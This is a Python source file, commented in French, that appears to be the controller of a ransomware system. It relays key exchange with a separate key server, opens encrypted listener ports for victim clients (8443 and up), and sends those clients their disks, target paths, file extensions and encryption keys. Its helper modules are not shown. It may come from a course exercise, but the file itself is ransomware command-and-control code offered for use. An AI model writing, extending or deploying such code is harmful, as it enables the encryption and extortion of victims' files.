import threading
import queue
import utile.network as net
import utile.message as message
import utile.security as secu


ransomware_threads = []
THREADS_QUEUE = []

def Serveur_cles(FIFO, FIFO_RESP):
    conn, gp = net.connect_to_serv(port=8381)
    FIFO.get() # pour débloquer
    FIFO.task_done()
    key = secu.Diffie_Hellman_exchange_key(conn, gp)
    ID_CLES = 0
    while True:
        packet = FIFO_RESP.get()
        packet = secu.AES_GCM_encrypt(packet, key)
        net.send_message(conn, packet)
        packet_retour = net.receive_message(conn)
        packet_retour = secu.AES_GCM_decrypt(packet_retour, key)
        FIFO.put([packet_retour, ID_CLES])



def ransomware(FIFO, PORT):
    indicateur = False
    socket_serv = net.start_net_serv_client(port=PORT)
    FIFO_resp = queue.Queue()
    THREADS_QUEUE.append(FIFO_resp)
    id = len(THREADS_QUEUE)-1
    print('Ouverture d\'une écoute sur le port', PORT)

    while True:
        conn, addr = socket_serv.accept()
        key = secu.Diffie_Hellman_exchange_key(conn)
        if indicateur == False:
            FIFO.put("{RANSOMWARE_REQ: None}")
            indicateur = True
        print(
            f'[+] Connexion établie sur le Thread Ransomware-{id} sur l\'adresse {conn.getsockname()[0]}:{conn.getsockname()[1]}\n')
        while True:
            try:
                recv_data = net.receive_message(conn)
                recv_data = secu.AES_GCM_decrypt(recv_data, key)
                FIFO.put([recv_data, id])
            except:
                conn.close()
                print(f'[+] Déconnexion du Ransomware-{id} sur le port : {PORT}')
                break

            while True:
                data = FIFO_resp.get()
                data_encrypted = secu.AES_GCM_encrypt(data, key)
                net.send_message(conn, data_encrypted)
                if message.get_message_type(data) == 'INITIALIZE_RESP':
                    break

def ThreadMaster(FIFO_RESP_CLES, data, FIFO_DATA):
    recv_data, id_thread = data
    FIFO_resp_thread = THREADS_QUEUE[id_thread]

    message_type = message.get_message_type(recv_data)
    if message_type == 'INITIALIZE_REQ':
        FIFO_DATA.put(recv_data['DISKS'])
        FIFO_RESP_CLES.put(recv_data)

    if message_type == 'INITIALIZE_KEY':
        id_victim, key, state = recv_data
        DISKS = FIFO_DATA.get()
        packet = message.set_message('INITIALIZE_RESP', [recv_data[id_victim], DISKS, "path", "file_ext", "freq", recv_data[key], recv_data[state]])
        id_thread = recv_data[id_victim]
        FIFO_resp_thread = THREADS_QUEUE[id_thread-1]
        FIFO_resp_thread.put(packet)


def main():
    PORT = 8443
    FIFO = queue.Queue()
    FIFO_RESP_CLES = queue.Queue()
    FIFO_DATA = queue.Queue()
    FIFO.put('WAITING FOR "Serveur clés"')
    # création des threads
    Serveur_cles_thread = threading.Thread(target=Serveur_cles, daemon=True, args=(FIFO, FIFO_RESP_CLES))
    ransomware12 = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))

    name, id = (ransomware12.getName()).split('-')
    ransomware12.setName('Ransomware-' + str((int(id) - 2)))
    ransomware_threads.append(ransomware12)

    # Lancement des threads

    Serveur_cles_thread.start()
    FIFO.join()
    ransomware12.start()

    while True:
        data = FIFO.get()
        if data == "{RANSOMWARE_REQ: None}":
            PORT += 1
            new_ransomware = threading.Thread(target=ransomware, daemon=True, args=(FIFO, PORT))
            name, id_thread = (new_ransomware.getName()).split('-')
            new_ransomware.setName('Ransomware-' + str((int(id_thread) - 2)))
            ransomware_threads.append(new_ransomware)
            new_ransomware.start()
        else:
            ThreadMaster(FIFO_RESP_CLES, data, FIFO_DATA)

if __name__ == '__main__':
    main()
